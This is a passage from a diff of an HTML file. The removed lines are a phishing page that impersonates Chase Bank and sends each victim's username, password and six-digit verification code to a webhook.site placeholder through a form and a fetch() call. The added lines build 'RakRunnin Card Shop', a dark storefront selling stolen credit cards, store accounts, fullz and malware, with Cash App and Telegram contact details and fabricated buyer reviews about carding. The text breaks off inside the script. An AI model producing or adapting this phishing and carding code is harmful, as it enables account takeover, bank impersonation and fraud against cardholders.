@@ -3,157 +3,1421 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank Login</title>
+  <title>RakRunnin Card Shop - Elite CCs, Fullz & Malware</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
+      background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+      color: #ffcccc;
+      font-family: 'Roboto Mono', monospace;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
+      padding: 0;
+      overflow-x: hidden;
+      scroll-behavior: smooth;
     }
-    /* Startup Page (Teaser) */
-    .startup {
-      height: 100vh;
-      background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==') no-repeat center center;
-      background-size: cover;
+    #captcha-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.98);
+      z-index: 1000;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      color: white;
-      text-align: center;
-      font-size: 2rem;
+      backdrop-filter: blur(10px);
+      transition: opacity 0.5s ease; /* Nyx: Smooth fade for captcha */
     }
-    /* Login Section (phish1.jpg) */
-    .login-section {
-      padding: 20px;
-      background-color: white;
-      max-width: 400px;
-      margin: 0 auto;
-      text-align: center;
+    #captcha-screen h2 {
+      color: #ff0000;
+      text-shadow: 0 0 12px #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3em;
+      animation: pulse 2s infinite;
     }
-    .login-section h2 {
-      color: #003087;
-      font-size: 1.5rem;
-      margin-bottom: 10px;
+    #captcha-screen input {
+      padding: 15px;
+      margin: 20px 0;
+      border: 2px solid #ff0000;
+      border-radius: 8px;
+      background: #1a1a1a;
+      color: #ffcccc;
+      font-size: 1.2em;
+      width: 200px;
+      transition: border-color 0.3s, transform 0.2s; /* Nyx: Added transform for input pop */
     }
-    .login-section input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+    #captcha-screen input:focus {
+      border-color: #cc0000;
+      outline: none;
+      transform: scale(1.05); /* Nyx: Subtle input scaling */
     }
-    .login-section button {
-      width: 100%;
-      padding: 10px;
-      background-color: #003087;
-      color: white;
+    #captcha-screen button {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 15px 30px;
       border: none;
-      border-radius: 4px;
+      border-radius: 8px;
       cursor: pointer;
+      font-size: 1.2em;
+      font-family: 'Orbitron', sans-serif;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
     }
-    .login-section button:hover {
-      background-color: #002266;
+    #captcha-screen button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
     }
-    /* Details Section (phish2.jpg) */
-    .details-section {
-      padding: 20px;
-      background-color: #f0f0f0;
-      text-align: left;
+    #captcha-screen button:hover::after {
+      width: 200px;
+      height: 200px;
     }
-    .details-section p {
-      color: #333;
-      font-size: 0.9rem;
-      margin: 5px 0;
+    #captcha-screen button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
     }
-    /* Code Page (Unique Post-Sign-In) */
-    .code-section {
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.98);
+      z-index: 999;
       display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.5em;
+      text-shadow: 0 0 12px #ff0000;
+      transition: opacity 0.5s ease; /* Nyx: Smooth loading screen fade */
+    }
+    #loading-screen p {
+      margin: 20px 0;
+    }
+    .stick-figure {
+      width: 250px;
+      height: 250px;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="20" r="12" fill="%23ff0000" filter="url(%23glow)"/><line x1="50" y1="32" x2="50" y2="65" stroke="%23ff0000" stroke-width="6"/><line x1="50" y1="40" x2="30" y2="50" stroke="%23ff0000" stroke-width="6"/><line x1="50" y1="40" x2="70" y2="50" stroke="%23ff0000" stroke-width="6"/><line x1="50" y1="65" x2="40" y2="85" stroke="%23ff0000" stroke-width="6"/><line x1="50" y1="65" x2="60" y2="85" stroke="%23ff0000" stroke-width="6"/><rect x="75" y="10" width="20" height="25" fill="%23ffd700" rx="5"/><text x="82.5" y="27" fill="%23ff0000" font-size="18">$</text><defs><filter id="glow"><feGaussianBlur stdDeviation="2.5" result="coloredBlur"/><feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs></svg>') no-repeat center;
+      animation: chase 1.5s infinite ease-in-out;
+    }
+    @keyframes chase {
+      0% { transform: translateX(0) rotate(0deg); }
+      50% { transform: translateX(60px) rotate(10deg); }
+      100% { transform: translateX(0) rotate(0deg); }
+    }
+    @keyframes pulse {
+      0% { text-shadow: 0 0 12px #ff0000; }
+      50% { text-shadow: 0 0 20px #ff0000; }
+      100% { text-shadow: 0 0 12px #ff0000; }
+    }
+    .container {
+      display: flex;
+      min-height: 100vh;
+      transition: transform 0.3s ease; /* Nyx: Smooth container transitions */
+    }
+    .menu-icon {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      font-size: 2.5em;
+      color: #ff0000;
+      cursor: pointer;
+      z-index: 100;
+      text-shadow: 0 0 10px #ff0000;
+      transition: transform 0.3s, filter 0.3s; /* Nyx: Added filter for glow */
+    }
+    .menu-icon:hover {
+      transform: rotate(90deg);
+      filter: brightness(1.5);
+    }
+    .sidebar {
+      width: 320px;
+      background: linear-gradient(to bottom, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      position: fixed;
+      height: 100%;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #ff0000 #1a1a1a;
+      box-shadow: 5px 0 15px rgba(255, 0, 0, 0.5);
+      transform: translateX(-100%);
+      transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+      z-index: 99;
+    }
+    .sidebar.active {
+      transform: translateX(0);
+    }
+    .sidebar h3 {
+      color: #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2em;
+      margin: 20px 0;
+      text-shadow: 0 0 10px #ff0000;
+      animation: pulse 2s infinite;
+    }
+    .sidebar ul {
+      list-style: none;
+      padding: 0;
+    }
+    .sidebar li {
+      margin: 25px 0;
+      color: #ffcccc;
+      font-size: 1.3em;
+      cursor: pointer;
+      transition: color 0.3s, transform 0.3s, background 0.3s;
+      padding: 12px;
+      border-radius: 8px;
+      background: #2a2a2a;
+      position: relative; /* Nyx: For ripple effect */
+      overflow: hidden;
+    }
+    .sidebar li::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 0, 0, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .sidebar li:hover::after {
+      width: 300px;
+      height: 300px;
+    }
+    .sidebar li:hover {
+      color: #ff0000;
+      transform: translateX(15px);
+      background: #3a3a3a;
+      box-shadow: 0 0 10px #ff0000;
+    }
+    .sidebar .sold-out {
+      color: #666;
+      cursor: default;
+      background: none;
+      box-shadow: none;
+    }
+    .main-content {
+      margin-left: 0;
+      padding: 40px;
+      width: 100%;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" stroke="%23ff0000" stroke-width="2" fill="none" opacity="0.1"/></svg>') repeat;
+      transition: opacity 0.5s ease; /* Nyx: Smooth content fade */
+    }
+    .user-info {
+      position: fixed;
+      top: 20px;
+      left: 80px;
+      color: #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.3em;
+      text-shadow: 0 0 10px #ff0000;
+      z-index: 100;
+      background: #1a1a1a;
+      padding: 10px 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ff0000;
+      transition: transform 0.3s; /* Nyx: Smooth user-info animation */
+    }
+    .user-info:hover {
+      transform: scale(1.05);
+    }
+    .account-section {
+      background: linear-gradient(to bottom, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      border-radius: 12px;
+      margin: 40px auto;
+      max-width: 800px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+      display: none;
+      animation: slideIn 0.5s ease-out;
+    }
+    .account-section input {
+      padding: 15px;
+      margin: 15px 0;
+      border: 2px solid #ff0000;
+      border-radius: 8px;
+      background: #2a2a2a;
+      color: #ffcccc;
+      font-size: 1.2em;
+      width: 100%;
+      max-width: 350px;
+      transition: border-color 0.3s, transform 0.2s;
+    }
+    .account-section input:focus {
+      border-color: #cc0000;
+      outline: none;
+      transform: scale(1.05);
+    }
+    .account-section button {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.2em;
+      font-family: 'Orbitron', sans-serif;
+      margin: 15px 10px;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    .account-section button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .account-section button:hover::after {
+      width: 200px;
+      height: 200px;
+    }
+    .account-section button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .header {
+      background: linear-gradient(to right, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
+      border-radius: 12px;
+      margin-bottom: 40px;
+    }
+    .header h1 {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3.5em;
+      color: #ff0000;
+      text-shadow: 0 0 15px #ff0000;
+      animation: pulse 2s infinite;
+    }
+    .header p {
+      font-size: 1.8em;
+      margin: 20px 0;
+      color: #cc0000;
+      text-shadow: 0 0 10px #cc0000;
+    }
+    .navbar {
+      background: linear-gradient(to right, #1a1a1a, #2a2a2a);
       padding: 20px;
-      background-color: white;
-      max-width: 400px;
-      margin: 0 auto;
-      text-align: center;
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      flex-wrap: wrap;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.7);
+      border-radius: 12px;
+      margin: 20px 0;
     }
-    .code-section.active {
+    .navbar button {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.2em;
+      font-family: 'Orbitron', sans-serif;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    .navbar button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .navbar button:hover::after {
+      width: 200px;
+      height: 200px;
+    }
+    .navbar button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .search-bar {
+      margin: 30px auto;
+      max-width: 700px;
+      position: relative;
+    }
+    .search-bar input {
+      width: 100%;
+      padding: 15px 50px 15px 20px;
+      border: 2px solid #ff0000;
+      border-radius: 8px;
+      background: #1a1a1a;
+      color: #ffcccc;
+      font-size: 1.2em;
+      box-shadow: inset 0 3px 6px rgba(0, 0, 0, 0.5);
+      transition: border-color 0.3s, transform 0.2s;
+    }
+    .search-bar input:focus {
+      border-color: #cc0000;
+      outline: none;
+      transform: scale(1.05);
+    }
+    .search-bar::after {
+      content: '🔍';
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ff0000;
+      font-size: 1.5em;
+    }
+    .section {
+      margin: 40px 0;
+      animation: slideIn 0.8s ease-out;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(50px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .section h2 {
+      color: #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.5em;
+      text-align: center;
+      text-shadow: 0 0 12px #ff0000;
+      margin-bottom: 30px;
+    }
+    .item-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 30px;
+      padding: 30px;
+      max-height: 1000px;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #ff0000 #1a1a1a;
+    }
+    .item {
+      background: linear-gradient(to bottom, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      border-radius: 12px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+      position: relative;
+      overflow: hidden;
+    }
+    .item:hover {
+      transform: translateY(-10px) rotate(1deg);
+      box-shadow: 0 15px 30px rgba(255, 0, 0, 0.7);
+    }
+    .item::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at top left, rgba(255, 0, 0, 0.2), transparent);
+      z-index: 0;
+    }
+    .item > * {
+      position: relative;
+      z-index: 1;
+    }
+    .item img {
+      width: 100%;
+      max-width: 300px;
+      height: auto;
+      border-radius: 8px;
+      margin: 0 auto 20px;
       display: block;
+      transition: transform 0.3s;
+      filter: drop-shadow(0 0 10px #ff0000);
     }
-    .code-section h2 {
-      color: #006400;
-      font-size: 1.5rem;
-      margin-bottom: 10px;
+    .item img:hover {
+      transform: scale(1.2);
     }
-    .code-section p {
-      color: #333;
-      font-size: 1rem;
-      margin-bottom: 10px;
+    .item h3 {
+      margin: 15px 0;
+      color: #ff0000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2em;
+      text-shadow: 0 0 10px #ff0000;
     }
-    .code-section input {
-      width: 50px;
-      height: 50px;
-      margin: 5px;
-      font-size: 1.5rem;
+    .item p {
+      margin: 10px 0;
+      font-size: 1.2em;
+      color: #cc0000;
+    }
+    .item .sold-out {
+      color: #666;
+      font-weight: bold;
+      font-size: 1.5em;
       text-align: center;
-      border: 2px solid #006400;
-      border-radius: 4px;
+    }
+    .item .stars {
+      color: #ffd700;
+      font-size: 1.3em;
+      margin: 15px 0;
+      text-align: center;
+    }
+    .confirmed-badge {
+      display: inline-block;
+      background: linear-gradient(to right, #ffd700, #ccac00);
+      color: #000;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 0.9em;
+      margin-left: 10px;
+      text-shadow: 0 0 3px rgba(0, 0, 0, 0.5);
+    }
+    .item .comment {
+      font-style: italic;
+      color: #ffcccc;
+      background: #2a2a2a;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-size: 1.1em;
+      border-left: 4px solid #ff0000;
+      transition: transform 0.3s ease; /* Nyx: Smooth comment animation */
+    }
+    .item .comment:hover {
+      transform: translateX(5px);
+    }
+    .reviews-btn {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1em;
+      font-family: 'Orbitron', sans-serif;
+      margin: 10px auto;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    .reviews-btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .reviews-btn:hover::after {
+      width: 150px;
+      height: 150px;
+    }
+    .reviews-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .reviews-container {
+      display: none;
+      margin-top: 15px;
+      padding: 15px;
+      background: #2a2a2a;
+      border-radius: 8px;
+      border: 2px solid #ff0000;
+      transition: max-height 0.5s ease, opacity 0.5s ease; /* Nyx: Smooth review toggle */
+    }
+    .reviews-container.active {
+      max-height: 500px;
+      opacity: 1;
+    }
+    .comment-input-container {
+      position: relative;
+      margin: 10px 0;
+    }
+    .comment-input {
+      padding: 12px 40px 12px 12px;
+      margin: 10px 0;
+      border: 2px solid #ff0000;
+      border-radius: 8px;
+      background: #2a2a2a;
+      color: #ffcccc;
+      font-size: 1.1em;
+      width: 100%;
+      transition: border-color 0.3s, transform 0.2s;
+    }
+    .comment-input:focus {
+      border-color: #cc0000;
+      outline: none;
+      transform: scale(1.02);
+    }
+    .comment-input:disabled {
+      background: #333;
+      color: #666;
+      cursor: not-allowed;
+    }
+    .lock-icon {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ff0000;
+      font-size: 1.2em;
+    }
+    .comment-btn {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1em;
+      font-family: 'Orbitron', sans-serif;
+      margin: 10px auto;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    .comment-btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .comment-btn:hover::after {
+      width: 150px;
+      height: 150px;
+    }
+    .comment-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .comment-btn:disabled {
+      background: #666;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .buy-btn {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.2em;
+      font-family: 'Orbitron', sans-serif;
+      margin: 15px auto;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    .buy-btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .buy-btn:hover::after {
+      width: 200px;
+      height: 200px;
+    }
+    .buy-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .buy-btn:disabled {
+      background: #666;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .job-section {
+      background: linear-gradient(to bottom, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      border-radius: 12px;
+      margin: 40px auto;
+      max-width: 800px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+      animation: slideIn 0.8s ease-out;
+    }
+    .job-section a {
+      color: #ff0000;
+      text-decoration: none;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.5em;
+      transition: color 0.3s, text-shadow 0.3s;
+      text-shadow: 0 0 10px #ff0000;
+    }
+    .job-section a:hover {
+      color: #cc0000;
+      text-shadow: 0 0 15px #cc0000;
+    }
+    .cart-icon {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 2em;
+      color: #ff0000;
+      cursor: pointer;
+      z-index: 100;
+      text-shadow: 0 0 10px #ff0000;
+      transition: transform 0.3s, filter 0.3s;
+    }
+    .cart-icon:hover {
+      transform: scale(1.2);
+      filter: brightness(1.5);
+    }
+    .cart-section {
+      background: linear-gradient(to bottom, #1a1a1a, #2a2a2a);
+      padding: 30px;
+      border-radius: 12px;
+      margin: 40px auto;
+      max-width: 800px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+      display: none;
+      animation: slideIn 0.5s ease-out;
+    }
+    .cart-item {
+      background: #2a2a2a;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-left: 4px solid #ff0000;
+      transition: transform 0.3s ease; /* Nyx: Smooth cart item animation */
+    }
+    .cart-item:hover {
+      transform: translateX(5px);
+    }
+    .cart-item p {
+      margin: 0;
+      font-size: 1.1em;
+    }
+    .cart-item button {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 8px 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1em;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+    .cart-item button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .cart-item button:hover::after {
+      width: 100px;
+      height: 100px;
+    }
+    .cart-item button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 10px #ff0000;
+    }
+    .theme-toggle {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1em;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+    .theme-toggle::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.5s, height 0.5s;
+    }
+    .theme-toggle:hover::after {
+      width: 100px;
+      height: 100px;
+    }
+    .theme-toggle:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff0000;
+    }
+    .dark-theme {
+      background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+    }
+    .neon-theme {
+      background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+      filter: hue-rotate(30deg);
+    }
+    .item-video {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 8px;
+      margin: 0 auto 20px;
+      display: none;
+      filter: drop-shadow(0 0 10px #ff0000);
     }
   </style>
 </head>
-<body>
-  <!-- Startup Teaser (Your Image) -->
-  <div class="startup">Secure Login Ahead</div>
-
-  <!-- Login Section (phish1.jpg) -->
-  <div class="login-section">
-    <h2>Sign In</h2>
-    <form id="loginForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST" onsubmit="showCodeSection(event)">
-      <input type="hidden" name="bank" value="chase">
-      <input type="text" name="username" placeholder="User ID" required>
-      <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Sign In</button>
-    </form>
+<body class="dark-theme">
+  <div id="captcha-screen">
+    <h2>Verify Access</h2>
+    <p>What is 9 + 4?</p>
+    <input type="text" id="captcha-input">
+    <button onclick="verifyCaptcha()">Submit</button>
   </div>
 
-  <!-- Details Section (phish2.jpg) -->
-  <div class="details-section">
-    <p>Protect your account with multi-factor authentication.</p>
-    <p>Need help? Call 1-800-935-9935.</p>
-    <p>© 2025 Chase Bank. All rights reserved.</p>
+  <div id="loading-screen">
+    <div class="stick-figure"></div>
+    <p>RakRunnin Loading...</p>
   </div>
 
-  <!-- Code Section (Unique Post-Sign-In) -->
-  <div class="code-section" id="codeSection">
-    <h2>Verification Code</h2>
-    <p>A 6-digit code has been sent to your phone. Enter it below:</p>
-    <form id="codeForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST">
-      <input type="hidden" name="bank" value="chase">
-      <input type="hidden" name="username" value="">
-      <input type="hidden" name="password" value="">
-      <input type="text" name="code1" maxlength="1" required>
-      <input type="text" name="code2" maxlength="1" required>
-      <input type="text" name="code3" maxlength="1" required>
-      <input type="text" name="code4" maxlength="1" required>
-      <input type="text" name="code5" maxlength="1" required>
-      <input type="text" name="code6" maxlength="1" required>
-      <button type="submit">Verify</button>
-    </form>
+  <div class="container">
+    <div class="menu-icon" onclick="toggleMenu()">☰</div>
+    <div class="cart-icon" onclick="showCart()">🛒</div>
+    <div class="sidebar" id="sidebar">
+      <h3>Available Drops</h3>
+      <ul id="sidebar-menu">
+        <li onclick="loadPage('cards')">Credit Cards</li>
+        <li onclick="loadPage('accounts')">Store Accounts</li>
+        <li onclick="loadPage('malware')">Malware</li>
+        <li onclick="loadPage('fullz')">Fullz</li>
+        <li onclick="showAccountSection()">Account</li>
+        <li onclick="showCart()">Cart</li>
+      </ul>
+    </div>
+    <div class="main-content" id="main-content">
+      <div class="user-info" id="user-info"></div>
+      <div class="account-section" id="account-section">
+        <h2>Account</h2>
+        <input type="text" id="username-input" placeholder="Username">
+        <input type="password" id="password-input" placeholder="Password">
+        <button onclick="createAccount()">Create Account</button>
+        <button onclick="login()">Login</button>
+        <button onclick="logout()">Logout</button>
+      </div>
+      <div class="cart-section" id="cart-section">
+        <h2>Your Cart</h2>
+        <div id="cart-items"></div>
+        <button class="buy-btn" onclick="checkout()">Checkout</button>
+      </div>
+      <div class="header">
+        <h1>RakRunnin Card Shop</h1>
+        <p>Elite Cards, Accounts, Malware & Fullz - Cash App Only - DM @rakrunnin on Telegram</p>
+      </div>
+
+      <div class="navbar">
+        <button onclick="filterItems('all', 'cardContainer', 'cards')">All Cards</button>
+        <button onclick="filterItems('Visa', 'cardContainer', 'cards')">Visa</button>
+        <button onclick="filterItems('MasterCard', 'cardContainer', 'cards')">MasterCard</button>
+        <button onclick="filterItems('Discover', 'cardContainer', 'cards')">Discover</button>
+        <button onclick="filterItems('Amex', 'cardContainer', 'cards')">Amex</button>
+        <button onclick="sortItems('cardContainer')">Sort by Price</button>
+        <button onclick="sortItemsByRating('cardContainer')">Sort by Rating</button>
+      </div>
+
+      <div class="search-bar">
+        <input type="text" placeholder="Search drops or BIN..." oninput="searchItems(this.value)">
+      </div>
+
+      <div class="section" id="cards-section">
+        <h2>Credit Cards</h2>
+        <div class="item-container" id="cardContainer"></div>
+      </div>
+
+      <div class="section" id="accounts-section" style="display: none;">
+        <h2>Store Accounts & Gift Cards</h2>
+        <div class="item-container" id="accountContainer"></div>
+      </div>
+
+      <div class="section" id="malware-section" style="display: none;">
+        <h2>Malware</h2>
+        <div class="item-container" id="malwareContainer"></div>
+      </div>
+
+      <div class="section" id="fullz-section" style="display: none;">
+        <h2>Fullz</h2>
+        <div class="item-container" id="fullzContainer"></div>
+      </div>
+
+      <div class="job-section">
+        <h2>Stack Cash Fast?</h2>
+        <p>Join @rakrunnin on Telegram for exclusive drops and methods!</p>
+        <a href="https://t.me/rakrunnin">DM @rakrunnin</a>
+      </div>
+    </div>
+    <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
   </div>
 
   <script>
-    function showCodeSection(event) {
-      event.preventDefault();
-      const form = document.getElementById('loginForm');
-      const codeSection = document.getElementById('codeSection');
-      const codeForm = document.getElementById('codeForm');
-      const formData = new FormData(form);
-      codeForm.querySelector('[name="username"]').value = formData.get('username');
-      codeForm.querySelector('[name="password"]').value = formData.get('password');
-      codeSection.classList.add('active');
-      formData.append('stage', 'login');
-      fetch(form.action, {
-        method: 'POST',
-        body: formData
+    const usernames = [
+      'cggtrey4', 'upoffccs12', 'realbreaswinnrrr', 'trappin4dayz', 'ccslime6',
+      'cashoutkidd9', 'foenem_drip', 'bandz2quick', 'swipegodx', 'hustle4realz',
+      'darkplugz', 'ghostbinz', 'quickcashx', 'slattmoney', 'neonbandit',
+      'shadowswipe', 'cryptohit', 'blitzdrop', 'iceprofit', 'vibez4sale',
+      'stackninja', 'cashghost', 'binlord', 'dripdemon', 'fastflipp', 
+      'voidhustle', 'glitchgod', 'swervecash', 'nightbandz', 'zerodrop'
+    ];
+    const commentPool = [
+      'I always by ccs frm here ts easy if yk wa u doin',
+      'ts be hittn for my cash app yoooo 😭',
+      'I don’t recommend low bal card they get flagged bro damnnnn 🤦‍♂️',
+      'if bro start responding faster I’ll leave a 5star but it’s decent I bought good eats 👀',
+      'foe I dead ass think ts was bap off these comments like idk how to explain ts I’m up now tho nbs',
+      'smb said he b scamming I had to see spent 25$ gang you just need to start responding faster 😭😭',
+      'please use a vpn if u gettin eats my homie made that mistake but the eats decent 👌🏽',
+      'came in clutch for back to school',
+      'idk bout y’all but broski responded for me 10/10',
+      'ccs need otp for saks bro pleaseee restock on saks overall it’s decent 😁😁',
+      'used da cc on saks it’s decent ima leave another review if they come',
+      'gangggg my cash app locked and I used dis card came in clutch no bs',
+      'foenem be takn ova long to answer but the cc work 😂🔥',
+      'copped some drip wit this, no cap, shit clean af',
+      'hit walmart for a tv, dis card went dummy 💪',
